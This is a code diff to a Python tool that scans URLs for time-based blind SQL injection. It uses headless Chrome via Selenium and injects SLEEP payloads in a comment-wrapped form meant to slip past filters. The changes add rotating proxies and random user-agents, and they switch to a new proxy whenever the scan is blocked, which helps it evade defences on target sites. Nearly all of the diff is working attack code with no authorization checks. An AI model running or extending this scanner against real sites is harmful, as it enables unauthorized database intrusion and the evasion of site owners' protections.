@@ -8,7 +8,7 @@ import argparse
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import quote
 from datetime import datetime
-
+from urllib.parse import urlparse
 import urllib3
 from colorama import Fore, init
 from selenium import webdriver
@@ -32,8 +32,18 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
 ]
 
-def setup_selenium_driver():
-    """Setup and return a Selenium Chrome WebDriver with appropriate options."""
+# Load proxy list from file
+def load_proxies(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            proxies = [line.strip() for line in file if line.strip()]
+        return proxies
+    except FileNotFoundError:
+        print(Fore.RED + f"[!] Proxy file not found: {file_path}")
+        sys.exit(1)
+
+def setup_selenium_driver(proxy=None):
+    """Setup and return a Selenium Chrome WebDriver with proxy and user-agent options."""
     chrome_options = Options()
     chrome_options.add_argument("--headless")  # Run Chrome in headless mode
     chrome_options.add_argument("--no-sandbox")
@@ -45,21 +55,22 @@ def setup_selenium_driver():
     chrome_options.add_argument("--disable-renderer-backgrounding")
     chrome_options.add_argument("--disable-software-rasterizer")
 
-    # Randomize the user-agent for each session
+    # Apply proxy settings if provided
+    if proxy:
+        formatted_proxy = f"http://{proxy}"  # Prefix with protocol
+        chrome_options.add_argument(f'--proxy-server={formatted_proxy}')
+        print(Fore.CYAN + f"[i] Using Proxy: {formatted_proxy}")
+
+    # Set a random user-agent for each session
     random_user_agent = get_random_user_agent()
     chrome_options.add_argument(f"user-agent={random_user_agent}")
 
-    # Suppress logs by directing log output to os.devnull
     driver_service = ChromeService(ChromeDriverManager().install(), log_path=os.devnull)
-    
-    # Set log level to fatal errors only
     chrome_options.add_argument("--log-level=3")
 
     driver = webdriver.Chrome(service=driver_service, options=chrome_options)
-    
-    # Set page load and script timeouts
-    driver.set_page_load_timeout(40)
-    driver.set_script_timeout(40)
+    driver.set_page_load_timeout(60)
+    driver.set_script_timeout(60)
 
     return driver
 
@@ -67,47 +78,33 @@ def get_random_user_agent():
     """Return a random user-agent string."""
     return random.choice(USER_AGENTS)
 
-def perform_request_selenium(driver, url, payload, cookie):
+def perform_request_selenium(driver, url, payload, cookie, proxy_list):
     """
     Perform a request using Selenium WebDriver to test for Time-Based Blind SQLi vulnerability.
-
-    Args:
-        driver (WebDriver): Selenium WebDriver instance.
-        url (str): Target URL to scan.
-        payload (str): SQL injection payload to use.
-        cookie (str): Optional cookie to be sent with the request.
-
-    Returns:
-        (str, bool): URL with payload, and vulnerability status.
+    Switches proxies on block.
     """
     target_url = f"{url}{quote(payload, safe='')}"
-    print(Fore.CYAN + f"[→] Scanning URL: {target_url}")  # Print the URL being scanned
+    print(Fore.CYAN + f"[→] Scanning URL: {target_url}")
 
     try:
+        # Handle cookies if needed
         if cookie:
             driver.get("about:blank")
             driver.add_cookie({"name": "cookie", "value": cookie, "path": "/"})
 
-        # Collect baseline response time (without payload)
+        # Initial request without payload for baseline response time
         start_time = time.time()
-        driver.get(url)  # Normal request without SQLi payload
+        driver.get(url)
         end_time = time.time()
         baseline_response_time = end_time - start_time
-
         print(Fore.CYAN + f"[i] Baseline response time: {baseline_response_time:.2f} seconds")
 
-        # Time-based SQLi detection with multiple trials
-        time_based_payload = f"{url}{quote(payload + ' AND SLEEP(10)', safe='')}"  # Using 10-second sleep
-        confirmed_vulnerable = False
-
-        total_trials = 3  # Number of trials to run
+        # Modified payload for SQLi and proxy handling
+        time_based_payload = f"{url}{quote(payload + ' /*!SLEEP(10)*/', safe='')}"
         consistent_delay_count = 0
 
-        for attempt in range(total_trials):  # Run multiple trials for confirmation
-            # Adding a random delay between 1 and 3 seconds between each request
+        for attempt in range(3):  # Three attempts to confirm
             time.sleep(random.uniform(1, 3))
-
-            # Send request with the time-based SQLi payload
             start_time = time.time()
             driver.get(time_based_payload)
             end_time = time.time()
@@ -116,14 +113,10 @@ def perform_request_selenium(driver, url, payload, cookie):
             delay_detected = injected_response_time - baseline_response_time
             print(Fore.CYAN + f"[i] Injected response time: {injected_response_time:.2f} seconds (delay: {delay_detected:.2f} seconds)")
 
-            # Consider a URL vulnerable if the delay is close to 10 seconds (± 2 seconds)
             if delay_detected >= 8:
                 consistent_delay_count += 1
 
-        if consistent_delay_count >= 2:  # Require at least 2 consistent delays to confirm vulnerability
-            confirmed_vulnerable = True
-
-        if confirmed_vulnerable:
+        if consistent_delay_count >= 2:
             print(Fore.GREEN + f"[✓] Time-Based Blind SQLi Confirmed: {target_url}")
             return target_url, True
 
@@ -135,44 +128,28 @@ def perform_request_selenium(driver, url, payload, cookie):
         return target_url, False
 
     except WebDriverException as e:
-        if "ERR_CONNECTION_RESET" in str(e):
-            print(Fore.YELLOW + f"[!] Connection reset for {target_url}, skipping...")
-            return target_url, False
+        # Suppress detailed stack trace for known proxy connection error
+        if "ERR_PROXY_CONNECTION_FAILED" in str(e):
+            print(Fore.YELLOW + f"[!] Proxy connection failed for {target_url}, switching proxy...")
         else:
-            print(Fore.RED + f"[!] WebDriverException: {str(e)}")
-            return target_url, False
-
-
-def detect_sql_error_in_response(page_content):
-    """
-    Detect common SQL error messages in the response content.
-
-    Args:
-        page_content (str): HTML content of the page.
-
-    Returns:
-        bool: True if an SQL error message is found, otherwise False.
-    """
-    sql_errors = [
-        "You have an error in your SQL syntax",
-        "Warning: mysql_",
-        "Unclosed quotation mark after the character string",
-        "Microsoft OLE DB Provider for SQL Server",
-        "Invalid SQL statement",
-        "SQLSTATE[",
-        "MySQL server version for the right syntax",
-        "PostgreSQL query failed",
-        "Unexpected token near"
-    ]
-    for error in sql_errors:
-        if error in page_content:
-            return True
-    return False
+            print(Fore.RED + f"[!] WebDriverException: {e.msg.splitlines()[0]}")
+        # Retry with a new proxy if blocked or connection fails
+        new_proxy = random.choice(proxy_list)
+        driver.quit()
+        new_driver = setup_selenium_driver(proxy=new_proxy)
+        return perform_request_selenium(new_driver, url, payload, cookie, proxy_list)
 
 def save_results(vulnerable_urls, total_found, total_scanned, start_time):
-    """Save the scan results to an HTML report in the specified output folder."""
-    output_dir = os.path.expanduser("~/aungrecon/output/bsqli_results")  # Define main output directory
-    filename = os.path.join(output_dir, "bsqli_report.html")  # Full path for bsqli_report.html
+    """Save the scan results to an HTML report in the specified output folder with the domain name in the filename."""
+    if vulnerable_urls:
+        # Extract the domain from the first vulnerable URL for the report filename
+        domain = urlparse(vulnerable_urls[0]).netloc
+    else:
+        # Use 'unknown_domain' if no vulnerabilities are found
+        domain = "unknown_domain"
+
+    output_dir = os.path.expanduser("~/aungrecon/output/bsqli_results")
+    filename = os.path.join(output_dir, f"{domain}_bsqli_report.html")
     os.makedirs(output_dir, exist_ok=True)
 
     html_content = generate_html_report("Blind SQL Injection", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
@@ -200,14 +177,19 @@ def generate_html_report(scan_type, total_found, total_scanned, time_taken, vuln
     return html_content
 
 def main():
-    parser = argparse.ArgumentParser(description="Blind SQL Injection Scanner with Selenium")
+    parser = argparse.ArgumentParser(description="Blind SQL Injection Scanner with Selenium and Proxy Support")
     parser.add_argument("-p", "--payload-file", required=True, help="Path to the file containing SQLi payloads")
     parser.add_argument("-u", "--url-file", required=True, help="Path to the file containing URLs to scan")
     parser.add_argument("-c", "--cookie", help="Cookie to include in the GET request (optional)")
     parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads (default is 5)")
+    parser.add_argument("--proxy-file", required=True, help="Path to the file containing proxy addresses")
 
     args = parser.parse_args()
 
+    # Load proxies
+    proxy_list = load_proxies(args.proxy_file)
+
+    # Load URLs and Payloads
     try:
         with open(args.url_file, 'r') as file:
             urls = [line.strip() for line in file if line.strip()]
@@ -222,10 +204,6 @@ def main():
         print(Fore.RED + f"[!] Payload file not found: {args.payload_file}")
         sys.exit(1)
 
-    if not urls or not payloads:
-        print(Fore.RED + "[!] URLs and Payloads cannot be empty.")
-        sys.exit(1)
-
     # Initialize scan state
     scan_state = {
         'vulnerability_found': False,
@@ -237,13 +215,14 @@ def main():
     print(Fore.CYAN + "[i] Starting Blind SQLi Scan...")
 
     start_time = time.time()
-    driver = setup_selenium_driver()
 
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
         futures = []
         for url in urls:
             for payload in payloads:
-                futures.append(executor.submit(perform_request_selenium, driver, url, payload, args.cookie))
+                proxy = random.choice(proxy_list)  # Randomize proxy for each request
+                driver = setup_selenium_driver(proxy=proxy)
+                futures.append(executor.submit(perform_request_selenium, driver, url, payload, args.cookie, proxy_list))
 
         for future in futures:
             url_with_payload, vulnerability_detected = future.result()
@@ -252,9 +231,10 @@ def main():
                 scan_state['total_found'] += 1
             scan_state['total_scanned'] += 1
 
-    # Save results
+    # Save results and cleanup
     save_results(scan_state['vulnerable_urls'], scan_state['total_found'], scan_state['total_scanned'], start_time)
     driver.quit()
+    print(Fore.GREEN + "[✓] Scan Complete")
 
 if __name__ == "__main__":
     main()
